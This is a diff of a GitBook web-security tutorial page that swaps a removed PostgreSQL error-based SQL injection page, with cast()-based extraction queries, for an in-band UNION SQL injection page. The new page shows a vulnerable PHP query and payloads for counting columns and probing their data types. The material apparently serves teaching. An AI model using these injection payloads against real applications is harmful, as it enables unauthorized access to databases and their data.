@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>postgreSQL Server · GitBook</title>
+        <title>In-band SQLi · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../blind-sqli/" />
+    <link rel="next" href="example.html" />
     
     
-    <link rel="prev" href="mysql-server.html" />
+    <link rel="prev" href="../sqli-basics.html" />
     
 
     </head>
@@ -168,9 +168,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.2" data-path="../in-band-sqli/">
+        <li class="chapter active" data-level="2.2.2" data-path="./">
             
-                <a href="../in-band-sqli/">
+                <a href="./">
             
                     
                     In-band SQLi
@@ -182,9 +182,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.2.1" data-path="../in-band-sqli/example.html">
+        <li class="chapter " data-level="2.2.2.1" data-path="example.html">
             
-                <a href="../in-band-sqli/example.html">
+                <a href="example.html">
             
                     
                     Example
@@ -200,9 +200,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3" data-path="./">
+        <li class="chapter " data-level="2.2.3" data-path="../error-based-sqli/">
             
-                <a href="./">
+                <a href="../error-based-sqli/">
             
                     
                     Error-based SQLi
@@ -214,9 +214,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.3.1" data-path="mssql-server.html">
+        <li class="chapter " data-level="2.2.3.1" data-path="../error-based-sqli/mssql-server.html">
             
-                <a href="mssql-server.html">
+                <a href="../error-based-sqli/mssql-server.html">
             
                     
                     MSSQL Server
@@ -227,9 +227,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3.2" data-path="mysql-server.html">
+        <li class="chapter " data-level="2.2.3.2" data-path="../error-based-sqli/mysql-server.html">
             
-                <a href="mysql-server.html">
+                <a href="../error-based-sqli/mysql-server.html">
             
                     
                     MySQL Server
@@ -240,9 +240,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.2.3.3" data-path="postgresql-server.html">
+        <li class="chapter " data-level="2.2.3.3" data-path="../error-based-sqli/postgresql-server.html">
             
-                <a href="postgresql-server.html">
+                <a href="../error-based-sqli/postgresql-server.html">
             
                     
                     postgreSQL Server
@@ -566,7 +566,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../../.." >postgreSQL Server</a>
+        <a href="../../.." >In-band SQLi</a>
     </h1>
 </div>
 
@@ -581,22 +581,101 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="postgresql-server">postgreSQL Server</h1>
-<p>To exploit a SQLi on a web application using PostgreSQL, you have to leverage the cast technique we saw for MSSQL</p>
-<p>You can use this technique to extract the DB version:</p>
-<pre><code class="lang-text"># select cast(version() as numeric);
-
-ERROR: invalid input syntax for type numeric: &quot;PostgreSQL 9.1.15 on x86_64-unknown-linux-gnu, compiled by gg (Debian 4.7.2-5) 4.7.2, 64-bit&quot;
+                                <h1 id="in-band-sqli">In-band SQLi</h1>
+<p>The best way to exploit in-band sqli is with the UNION command. However, there are some important things you need to take in account:</p>
+<ul>
+<li>The field types of the second SELECT must match the ones in the first statemement.</li>
+<li>The number of fields in the second SELECT must match the first statement.</li>
+<li>To successfully perform the attack, we need to understand the structure of the database (tables and columns).</li>
+</ul>
+<p>To solve the first two issues, lets enumerate the number of columns/fields a query selects:</p>
+<pre><code class="lang-text">mysql_query(&quot;SELECT id, real_name FROM users WHERE id=&quot;.$GET[&apos;id&apos;].&quot;;&quot;);
 </code></pre>
-<p>Or the tables, by iterating over the information_schema special database:</p>
-<pre><code class="lang-text">dbname=# select cast ((select table name from information schema.tables limit 1 offset 0) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_statistic&quot;
+<p>The columns and data types are:</p>
+<ul>
+<li>id has data type int</li>
+<li>real_name has data type varchar (string)</li>
+</ul>
+<p>In this case, for the second SELECT statement using UNION, if we select more than 2 columns or if the number is correct but the data type is different it will not work and will try to throw an error:</p>
+<p>MySQL:</p>
+<pre><code class="lang-text">The used SELECT statement have a different number of columns
+</code></pre>
+<p>MS SQL:</p>
+<pre><code class="lang-text">All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target list.
+</code></pre>
+<p>PostgreSQL:</p>
+<pre><code class="lang-text">Each UNION query must have the same number of columns.
+</code></pre>
+<p>Oracle:</p>
+<pre><code class="lang-text">ORA-01789: query block has incorrect number of result columns.
+</code></pre>
+<p>Detecting the number of fields needed to exploit an in-band SQL injection looks like:</p>
+<pre><code class="lang-text">&gt; 9999 UNION SELECT NULL; ---
+&gt; 9999 UNION SELECT NULL, NULL; ---
+&gt; 9999 UNION SELECT NULL, NULL, NULL; ---
+&gt; 9999 UNION SELECT NULL, NULL, NULL, NULL; ---
 
-dbname=# select cast ((select table name from information schema.tables limit 1 offset 1) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_type&quot;
+Another example:
 
-dbname=# select cast ((select table name from information schema.tables limit 1 offset 2) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
+&gt; 1111&apos; UNION SELECT NULL; -- -
+&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
+&gt; 1111&apos; UNION SELECT NULL, NULL, NULL; -- -
+&gt; 1111&apos; UNION SELECT NULL, NULL, NULL, NULL; -- -
+</code></pre>
+<p>Other way to enumerate fields is to use ORDER BY:</p>
+<pre><code class="lang-text">&gt; search=Tom&apos; ORDER BY 1-- -
+&gt; search=Tom&apos; ORDER BY 2-- -
+&gt; search=Tom&apos; ORDER BY 3-- -
+&gt; search=Tom&apos; ORDER BY 4-- -
+&gt; search=Tom&apos; ORDER BY 5-- -
+&gt; search=Tom&apos; ORDER BY 6-- -
+</code></pre>
+<p>For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn&apos;t throw an error anymore, as the two statements finally will be balanced (with the same number of fields in both SELECT statements).</p>
+<p>This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.</p>
+<p>Now, to discover the datatype of each field, we can simply repeat the same exercise since most DBMS won&apos;t allow UNION based queries if the datatype are different, therefore:</p>
+<pre><code class="lang-text">&gt; SELECT 1 UNION &apos;a&apos;;
+</code></pre>
+<p>Won&apos;t work and will trigger an error.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">DBMS</th>
+<th style="text-align:left">Datatype enforcing</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MySQL</td>
+<td style="text-align:left">No</td>
+</tr>
+<tr>
+<td style="text-align:left">MSSQL</td>
+<td style="text-align:left">Yes</td>
+</tr>
+<tr>
+<td style="text-align:left">ORACLE</td>
+<td style="text-align:left">Yes</td>
+</tr>
+<tr>
+<td style="text-align:left">PostgreSQL</td>
+<td style="text-align:left">Yes</td>
+</tr>
+</tbody>
+</table>
+<p>Now, we:</p>
+<ul>
+<li>Substitute one of the null fields with a constant.</li>
+<li>If the constant type is correct, the query will work</li>
+<li>If the type is wrong, the webapp will throw an error or misbehave</li>
+</ul>
+<p>So after finding the number of fields, we change the datatypes:</p>
+<pre><code class="lang-text">&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
+#Change first field to int
+&gt; 1111&apos; UNION SELECT 1, NULL; -- -
+#If no errors, change the second field to int
+&gt; 1111&apos; UNION SELECT 1, 1; -- -
+#If errors, change the second field to string
+&gt; 1111&apos; UNION SELECT 1, &apos;a&apos;; -- -
 </code></pre>
 
                                 
@@ -625,12 +704,12 @@ ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
 
             
                 
-                <a href="mysql-server.html" class="navigation navigation-prev " aria-label="Previous page: MySQL Server">
+                <a href="../sqli-basics.html" class="navigation navigation-prev " aria-label="Previous page: SQLi Basics">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="../blind-sqli/" class="navigation navigation-next " aria-label="Next page: Blind SQLi">
+                <a href="example.html" class="navigation navigation-next " aria-label="Next page: Example">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -641,7 +720,7 @@ ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"postgreSQL Server","level":"2.2.3.3","depth":3,"next":{"title":"Blind SQLi","level":"2.2.4","depth":2,"path":"web-stuff/sqli/blind-sqli/README.md","ref":"web-stuff/sqli/blind-sqli/README.md","articles":[{"title":"Bisection Technique","level":"2.2.4.1","depth":3,"path":"web-stuff/sqli/blind-sqli/bisection-technique.md","ref":"web-stuff/sqli/blind-sqli/bisection-technique.md","articles":[]},{"title":"Time-Based Blind SQLi","level":"2.2.4.2","depth":3,"path":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","ref":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","articles":[]}]},"previous":{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/error-based-sqli/postgresql-server.md","mtime":"2020-08-01T10:54:50.176Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-08-01T13:56:26.015Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"In-band SQLi","level":"2.2.2","depth":2,"next":{"title":"Example","level":"2.2.2.1","depth":3,"path":"web-stuff/sqli/in-band-sqli/example.md","ref":"web-stuff/sqli/in-band-sqli/example.md","articles":[]},"previous":{"title":"SQLi Basics","level":"2.2.1","depth":2,"path":"web-stuff/sqli/sqli-basics.md","ref":"web-stuff/sqli/sqli-basics.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/in-band-sqli/README.md","mtime":"2020-08-01T10:54:50.192Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-08-01T13:56:26.015Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
